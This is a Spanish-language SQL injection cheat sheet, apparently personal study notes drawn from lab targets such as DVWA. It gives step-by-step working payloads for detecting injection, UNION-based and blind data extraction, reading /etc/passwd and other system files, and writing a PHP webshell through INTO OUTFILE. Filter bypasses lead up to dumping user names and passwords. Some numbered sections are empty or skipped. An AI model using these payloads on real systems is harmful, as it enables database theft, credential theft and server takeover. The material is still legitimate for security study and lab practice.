=== PASO 1: DETECTAR Y CLASIFICAR VULNERABILIDAD ===

--- Arbol de decision ---

1. Prueba ' → ¿da error visible?
   SI  → injectable, puede ser UNION-Based o Error-Based
   NO  → puede ser Blind o no vulnerable, sigue al paso 2

2. Prueba 1' AND 1=1-- -  y  1' AND 1=2-- -
   Respuestas DIFERENTES → Boolean-Based Blind → ir a seccion BLIND
   Misma respuesta        → probar Time-Based, sigue al paso 3

3. Prueba 1' AND sleep(5)-- -
   Tarda ~5 segundos → Time-Based Blind → ir a seccion TIME-BASED
   No tarda           → probablemente no vulnerable

4. Prueba 1' UNION SELECT NULL-- - (subiendo NULLs hasta que funcione)
   Funciona → UNION-Based → seguir con PASO 2 de esta guia

--- Payloads de deteccion ---

'
' -- -
' OR '1'='1' -- -
1' AND '1'='1' -- -
1' AND '1'='2' -- -   (comparar respuestas)


=== PASO 2: CONTAR COLUMNAS ===

1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -     (subir hasta error)

NOTA: ORDER BY 1 SIEMPRE funciona independientemente del numero de columnas,
por eso no sirve como referencia. El primer error te da el numero real.
Si ORDER BY da problemas, probar con #:
1' ORDER BY 1#
1' ORDER BY 2#

Confirmar con UNION (usar NULL, no numeros - ver nota abajo):
1' UNION SELECT NULL-- -
1' UNION SELECT NULL,NULL-- -
1' UNION SELECT NULL,NULL,NULL-- -

[!] IMPORTANTE: Usar siempre NULL en vez de 1,2,3
    NULL es compatible con cualquier tipo de columna (string, int, etc.)
    Un entero como 1 puede dar error de tipos si la columna espera string.


=== PASO 3: IDENTIFICAR COLUMNAS VISIBLES ===

1' UNION SELECT 'columna1','columna2'-- -
(ver que etiqueta aparece en cada campo de la respuesta)

[!] ERROR COMUN: el campo se llama schema_name, NO schemata_name


=== PASO 6: LISTAR TABLAS ===

De una BD concreta:
1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='nombre_bd'-- -

De todas las BDs a la vez:
1' UNION SELECT table_schema,table_name FROM information_schema.tables-- -

De la BD actual:
1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()-- -


=== PASO 7: LISTAR COLUMNAS DE UNA TABLA ===

=== PASO 8: EXTRAER DATOS ===

Concatenar varios campos:

=== PASO 9: VERIFICAR PRIVILEGIOS (para escalada) ===

Usuario y BD actuales:
1' UNION SELECT user(),database()-- -

Privilegio de escritura de ficheros:
1' UNION SELECT file_priv,null FROM mysql.user WHERE user='root'-- -
(Y = tiene privilegios, N = no tiene)

Restriccion de directorio de escritura:
1' UNION SELECT @@secure_file_priv,null-- -
(vacio = sin restriccion, ruta = solo puede escribir ahi)

Directorio de plugins:
1' UNION SELECT @@plugin_dir,null-- -

Version y arquitectura del servidor:
1' UNION SELECT version(),null-- -
1' UNION SELECT @@version_compile_os,@@version_compile_machine-- -


=== PASO 10: LEER Y ESCRIBIR FICHEROS ===

OUTFILE vs DUMPFILE - diferencia importante:
  INTO OUTFILE  -> añade separadores y saltos de linea (para texto/CSV)
  INTO DUMPFILE -> escribe byte a byte sin añadir nada (para binarios como .so)

Leer ficheros del sistema:
1' UNION SELECT LOAD_FILE('/etc/passwd'),null-- -
1' UNION SELECT LOAD_FILE('/etc/crontab'),null-- -
1' UNION SELECT LOAD_FILE('/opt/lampp/etc/httpd.conf'),null-- -

Verificar si un fichero existe y tiene contenido:
1' UNION SELECT LOAD_FILE('/ruta/fichero'),null-- -
(null en surname = fichero no existe o sin permisos)
(contenido en surname = fichero leido correctamente)

Escribir webshell (texto plano - usar OUTFILE):
1' UNION SELECT '<?php system($_GET["cmd"]); ?>',null INTO OUTFILE '/ruta/shell.php'-- -

Escribir binario (.so, .dll - usar DUMPFILE):
1' UNION SELECT LOAD_FILE('/origen/fichero'),null INTO DUMPFILE '/destino/fichero'-- -

[!] ERRORES COMUNES al escribir:
  Errcode 13 = Permission denied (MySQL no tiene permisos de SO en ese directorio)
  Errcode 2  = No such file or directory (la ruta no existe)
  Warning mysql_numrows() = La query fallo silenciosamente (puede ser exito en OUTFILE)
  Verificar siempre con LOAD_FILE si el fichero se escribio correctamente


=====================================================
            BLIND - PASO A PASO
=====================================================

=== PASO 1: CONFIRMAR BLIND ===

1' AND 1=1-- -    (respuesta normal)
1' AND 1=2-- -    (respuesta diferente)


=== PASO 2: LONGITUD DE DATABASE() ===

1' AND length(database())=1-- -
1' AND length(database())=2-- -
...hasta TRUE


=== PASO 3: EXTRAER DATABASE() CARACTER A CARACTER ===

1' AND substring(database(),1,1)='a'-- -
1' AND substring(database(),1,1)='b'-- -
...hasta TRUE, luego posicion 2, 3, etc.

Bypass comillas con ASCII (si las comillas estan filtradas):
1' AND ascii(substring(database(),1,1))=100-- -


=== PASO 4: CONTAR BASES DE DATOS ===

1' AND (SELECT count(schema_name) FROM information_schema.schemata)=1-- -
1' AND (SELECT count(schema_name) FROM information_schema.schemata)=5-- -


=== PASO 5: LONGITUD NOMBRE BD (posicion X) ===

1' AND (SELECT length(schema_name) FROM information_schema.schemata LIMIT 0,1)=18-- -
1' AND (SELECT length(schema_name) FROM information_schema.schemata LIMIT 1,1)=4-- -


=== PASO 6: EXTRAER NOMBRE BD CARACTER A CARACTER ===

1' AND substring((SELECT schema_name FROM information_schema.schemata LIMIT 2,1),1,1)='d'-- -
1' AND substring((SELECT schema_name FROM information_schema.schemata LIMIT 2,1),2,1)='v'-- -


=== PASO 7: REPETIR PARA TABLAS ===

Contar tablas:
1' AND (SELECT count(table_name) FROM information_schema.tables WHERE table_schema='dvwa')=2-- -

Longitud nombre tabla:
1' AND (SELECT length(table_name) FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1)=5-- -

Extraer nombre:
1' AND substring((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1),1,1)='u'-- -

(mismo proceso con information_schema.columns y luego la tabla objetivo)


=====================================================
            TIME-BASED BLIND
=====================================================

Confirmar:
1' AND sleep(5)-- -         (si tarda 5s = vulnerable)

Condicional (mas eficiente, solo duerme si condicion TRUE):
1' AND IF(substring(database(),1,1)='d', sleep(5), 0)-- -

Si SLEEP esta filtrado:
1' AND BENCHMARK(10000000,MD5('A'))-- -

MSSQL:
1'; WAITFOR DELAY '00:00:05'-- -

PostgreSQL:
1'; SELECT pg_sleep(5)-- -


=====================================================
            BYPASS - ESPACIOS FILTRADOS
=====================================================

Sustituir espacios por:

%09  = Tab (el mas fiable)
%0a  = Newline (salto de linea)
%0b  = Tab vertical
%0c  = Form feed
/**/  = Comentario vacio
+    = Espacio (a veces)

Ejemplo con %09:
?name=root'%09OR%09'1'='1
?name=x'%09UNION%09SELECT%091,2,3,4,'5


=====================================================
         BYPASS - SIN COMENTARIOS (-- -)
=====================================================

Cuando no puedes usar -- - o # para comentar el resto.

TRUCO: La comilla final de la consulta original cierra tu payload.

Consulta original:
SELECT * FROM users WHERE name='INPUT'

PAYLOAD (ultimo valor con comilla antes, no despues):
?name=x'%09UNION%09SELECT%091,2,3,4,'5

Resultado:
SELECT * FROM users WHERE name='x' UNION SELECT 1,2,3,4,'5'
                                                         ^ esta la pone la consulta original

FLUJO COMPLETO SIN COMENTARIOS:

1. Detectar:
?name=root'%09OR%09'1'='1

2. Contar columnas (probar hasta que funcione):
?name=x'%09UNION%09SELECT%09'1
?name=x'%09UNION%09SELECT%091,'2
?name=x'%09UNION%09SELECT%091,2,'3
?name=x'%09UNION%09SELECT%091,2,3,'4
?name=x'%09UNION%09SELECT%091,2,3,4,'5

3. Info basica:
?name=x'%09UNION%09SELECT%091,database(),user(),4,'5

4. Listar BDs:
?name=x'%09UNION%09SELECT%091,schema_name,3,4,'5'%09FROM%09information_schema.schemata%09WHERE%09'1'='1

5. Listar tablas:
?name=x'%09UNION%09SELECT%091,table_name,3,4,'5'%09FROM%09information_schema.tables%09WHERE%09table_schema='exercises

6. Listar columnas:
?name=x'%09UNION%09SELECT%091,column_name,3,4,'5'%09FROM%09information_schema.columns%09WHERE%09table_name='users

7. Extraer datos:
?name=x'%09UNION%09SELECT%091,name,passwd,4,'5'%09FROM%09users%09WHERE%09'1'='1
